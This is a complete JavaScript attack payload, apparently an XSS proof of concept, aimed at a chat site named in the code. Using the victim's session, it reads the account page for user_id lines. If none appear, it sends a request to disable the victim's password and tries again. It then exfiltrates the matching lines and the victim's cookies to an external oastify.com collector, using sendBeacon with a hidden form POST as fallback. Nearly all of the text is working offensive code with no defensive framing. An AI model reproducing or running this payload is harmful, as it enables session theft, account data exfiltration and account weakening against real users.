(async () => {
  const TARGET = window.location.origin + "/app/";
  const COLLECT_BASE = "https://9eo1avfkp36tcxhc41kcatpuul0co3srh.oastify.com/collect";

  async function sendToCollector(hits) {
    const cookies = document.cookie || "";
    const meta = { cookies, page: location.href, ts: new Date().toISOString() };

    const metaJson = JSON.stringify(meta);
    const metaB64 = btoa(unescape(encodeURIComponent(metaJson)));

    const MAX_COOKIE_QS_LEN = 1900;
    let finalMetaB64 = metaB64;
    if (metaB64.length > MAX_COOKIE_QS_LEN) {
      const truncated = Object.assign({}, meta, { cookies: cookies.slice(0, 1000) });
      finalMetaB64 = btoa(unescape(encodeURIComponent(JSON.stringify(truncated))));
      console.warn("Meta truncated for URL length");
    }

    const qs = new URLSearchParams({ payload_b64: finalMetaB64 });
    const collectUrl = COLLECT_BASE + "?" + qs.toString();

    // sendBeacon first
    try {
      const ok = navigator.sendBeacon(collectUrl, new Blob([hits.join("\n")], { type: "text/plain" }));
      if (ok) return;
    } catch (e) {
      console.warn("sendBeacon failed:", e);
    }

    // fallback form POST
    try {
      const iframeName = "exf_ifr_" + Math.random().toString(36).slice(2);
      const iframe = document.createElement("iframe");
      iframe.name = iframeName;
      iframe.style.display = "none";
      document.documentElement.appendChild(iframe);

      const form = document.createElement("form");
      form.method = "POST";
      form.action = collectUrl;
      form.enctype = "text/plain";
      form.target = iframeName;

      const ta = document.createElement("textarea");
      ta.name = "body";
      ta.value = hits.join("\n");
      form.appendChild(ta);

      form.style.display = "none";
      document.documentElement.appendChild(form);
      form.submit();

      setTimeout(() => { form.remove(); iframe.remove(); }, 2000);
    } catch (e) {
      console.error("Fallback form POST error:", e);
    }
  }

  try {
    let r = await fetch(TARGET, { method: "GET", credentials: "include" });
    let text = await r.text();
    let lines = text.split(/\r?\n/);

    let hits = lines.filter(l => /user_id/i.test(l));

    if (!hits.length) {
      console.log("no user_id found — trying to disable password");

      // disable password (same-origin POST, no custom headers)
      try {
        await fetch("https://chat33.me/app/ajax/setting/del_pass", {
          method: "POST",
          credentials: "include"
        });
        console.log("Password disable request sent");

        // wait a short moment then re-fetch /app/
        await new Promise(res => setTimeout(res, 500));
        r = await fetch(TARGET, { method: "GET", credentials: "include" });
        text = await r.text();
        lines = text.split(/\r?\n/);
        hits = lines.filter(l => /user_id/i.test(l));

        if (!hits.length) {
          console.log("Still no user_id after disabling password");
          return;
        }
        console.log("user_id found after disabling password");
      } catch (e) {
        console.error("Error disabling password:", e);
        return;
      }
    }

    // send hits + cookies/meta to collector
    await sendToCollector(hits);
    console.log("Exfiltrated hits + cookies/meta");

  } catch (err) {
    console.error("Fetch error:", err);
  }
})();
